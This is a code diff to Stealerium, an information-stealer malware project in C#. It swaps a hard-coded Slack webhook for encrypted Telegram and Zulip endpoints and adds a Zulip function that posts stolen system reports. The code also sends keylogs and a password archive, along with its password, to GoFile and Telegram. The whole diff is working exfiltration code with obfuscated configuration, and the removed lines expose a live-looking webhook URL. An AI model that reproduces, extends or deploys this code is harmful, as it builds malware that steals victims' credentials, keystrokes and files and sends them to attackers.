@@ -9,6 +9,7 @@ using System.Text.RegularExpressions;
 using Stealerium.Helpers;
 using Stealerium.Modules.Implant;
 using Stealerium.Target.System;
+using System.Collections.Generic;
 
 namespace Stealerium
 {
@@ -16,16 +17,27 @@ namespace Stealerium
     {
         private const int MaxKeylogs = 10;
 
-        private static string TelegramBotAPI = "https://api.telegram.org/bot";
-
-        // Slack webhook URL
-        private static readonly string SlackWebhookUrl = "https://hooks.slack.com/services/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";
+        private static string TelegramBotAPI = StringsCrypt.DecryptConfig("ENCRYPTED:BncRbgTGet4L+mKqD8dz7h8EdEcrI2Pbm5InYO5Ff/I=");
+        private static string ZulipAPIBaseUrl = StringsCrypt.DecryptConfig("ENCRYPTED:hu7mPNLn8F3W1m8DcwM5LXHInCJglBwFsWCfcHCJ9tF7oYejzA1wmRf7U4KxfmKxWUHNJ/cIv306TuGoVjZvAA==");
+        private static string ZulipEmail = StringsCrypt.DecryptConfig("ENCRYPTED:CPB7ti0A5zas/0dF4XBKzDiUIfmQ5RgrLQvDrYCST4M=");
+        private static string ZulipAPIKey = StringsCrypt.DecryptConfig("ENCRYPTED:cYs6KSRyO3yMrWGQDOmKxivjCVxRHP8X2elXQtdRGbiad1fFkV3DBIHK2EbuIBDA");
 
         // Message id location
         private static readonly string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");
 
         // Keylogs history file
         private static readonly string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");
+
+        /// <summary>
+        /// Get sent message ID
+        /// </summary>
+        /// <param name="response">Telegram bot API response</param>
+        /// <returns>Message ID, or -1 if not found or an error occurs</returns>
+        private static int GetMessageId(string response)
+        {
+            var match = Regex.Match(response, "\"result\":{\"message_id\":\\d+");
+            return Int32.Parse(match.Value.Replace("\"result\":{\"message_id\":", ""));
+        }
 
         // Save latest message id to file
         private static void SetLatestMessageId(int id)
@@ -71,17 +83,6 @@ namespace Stealerium
         }
 
         /// <summary>
-        /// Get sent message ID
-        /// </summary>
-        /// <param name="response">Telegram bot API response</param>
-        /// <returns>Message ID, or -1 if not found or an error occurs</returns>
-        private static int GetMessageId(string response)
-        {
-            var match = Regex.Match(response, "\"result\":{\"message_id\":\\d+");
-            return Int32.Parse(match.Value.Replace("\"result\":{\"message_id\":", ""));
-        }
-
-        /// <summary>
         /// Send message to Telegram bot asynchronously
         /// </summary>
         /// <param name="text">Message text</param>
@@ -121,6 +122,54 @@ namespace Stealerium
 
             // Return 0 if there was an error or the request failed
             return 0;
+        }
+
+        /// <summary>
+        /// Send message to Zulip stream (channel) asynchronously
+        /// </summary>
+        /// <param name="streamName">Stream (channel) name</param>
+        /// <param name="topic">Topic under the stream</param>
+        /// <param name="messageContent">Message content</param>
+        /// <returns>A Task representing the asynchronous operation</returns>
+        public static async Task SendZulipMessageAsync(string streamName, string topic, string messageContent)
+        {
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    // Build the request body with the correct content type (form data)
+                    var formData = new FormUrlEncodedContent(new[]
+                    {
+                        new KeyValuePair<string, string>("type", "stream"),          // Message type (stream)
+                        new KeyValuePair<string, string>("to", streamName),          // Stream name
+                        new KeyValuePair<string, string>("topic", topic),            // Topic under the stream
+                        new KeyValuePair<string, string>("content", messageContent)  // Actual message content
+                    });
+
+                    // Add Basic authentication using Zulip email and API key
+                    var byteArray = Encoding.ASCII.GetBytes($"{ZulipEmail}:{ZulipAPIKey}");
+                    client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Basic", Convert.ToBase64String(byteArray));
+
+                    // Send the POST request asynchronously
+                    HttpResponseMessage response = await client.PostAsync(ZulipAPIBaseUrl, formData);
+
+                    // Check if the request was successful
+                    if (response.IsSuccessStatusCode)
+                    {
+                        Logging.Log("Message sent to Zulip successfully.");
+                    }
+                    else
+                    {
+                        // Log the detailed error message
+                        string responseBody = await response.Content.ReadAsStringAsync();
+                        Logging.Log($"Failed to send message to Zulip. Status code: {response.StatusCode}, Response: {responseBody}");
+                    }
+                }
+            }
+            catch (Exception error)
+            {
+                Logging.Log("Zulip >> SendMessage exception:\n" + error);
+            }
         }
 
         /// <summary>
@@ -197,45 +246,7 @@ namespace Stealerium
         }
 
         /// <summary>
-        /// Send a report to Slack asynchronously
-        /// </summary>
-        /// <param name="text">Message text</param>
-        /// <returns>Returns a Task indicating completion</returns>
-        public static async Task SendSlackMessageAsync(string text)
-        {
-            try
-            {
-                using (HttpClient client = new HttpClient())
-                {
-                    // Create the JSON payload for Slack
-                    var payload = new
-                    {
-                        text = text
-                    };
-
-                    // Convert the payload to JSON
-                    var jsonPayload = JsonSerializer.Serialize(payload);
-
-                    // Send a POST request to the Slack webhook URL
-                    var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
-                    HttpResponseMessage response = await client.PostAsync(SlackWebhookUrl, content);
-
-                    // Log the result
-                    if (!response.IsSuccessStatusCode)
-                    {
-                        Logging.Log("Message sending failed with status code: " + response.StatusCode);
-                    }
-                }
-            }
-            catch (Exception error)
-            {
-                // Log any exceptions that occur during the request
-                Logging.Log("SendMessage exception:\n" + error);
-            }
-        }
-
-        /// <summary>
-        ///     Upload keylogs to GoFile
+        /// Upload keylogs to GoFile
         /// </summary>
         private static void UploadKeylogs()
         {
@@ -252,7 +263,7 @@ namespace Stealerium
         }
 
         /// <summary>
-        ///     Get string with keylogs history
+        /// Get string with keylogs history
         /// </summary>
         /// <returns></returns>
         private static string GetKeylogsHistory()
@@ -268,7 +279,7 @@ namespace Stealerium
         }
 
         /// <summary>
-        ///     Format system information for sending to telegram bot
+        /// Format system information for sending to Telegram and Zulip
         /// </summary>
         /// <returns>String with formatted system information</returns>
         private static async Task SendSystemInfoAsync(string url)
@@ -357,19 +368,20 @@ namespace Stealerium
                        + "\n🔐 Archive password is: \"" + StringsCrypt.ArchivePassword + "\""
                        + "```";
 
-            // Send to Telegram
+            // Send the report to Telegram
             int last = GetLatestMessageId();
             if (last != -1)
                 await EditMessageAsync(info, last).ConfigureAwait(false);
             else
                 SetLatestMessageId(await SendMessageAsync(info).ConfigureAwait(false));
 
-            // Send to Slack
-            await SendSlackMessageAsync(info);
+            // Send the report to Zulip
+            await SendZulipMessageAsync("Szurubooru", "stealerium", info).ConfigureAwait(false);
         }
 
+
         /// <summary>
-        /// Send report asynchronously to Telegram and Slack
+        /// Send report asynchronously to Telegram
         /// </summary>
         /// <param name="file">The file path of the archive</param>
         /// <returns>A Task representing the asynchronous operation</returns>
@@ -377,9 +389,9 @@ namespace Stealerium
         {
             Logging.Log("Sending passwords archive to Gofile");
             var url = GofileFileService.UploadFileAsync(file);
-            Logging.Log("Sending report to Telegram and Slack");
+            Logging.Log("Sending report to Telegram");
             await SendSystemInfoAsync(await url.ConfigureAwait(false)).ConfigureAwait(false);
-            Logging.Log("Report sent to Telegram and Slack");
+            Logging.Log("Report sent to Telegram");
             File.Delete(file);
         }
     }
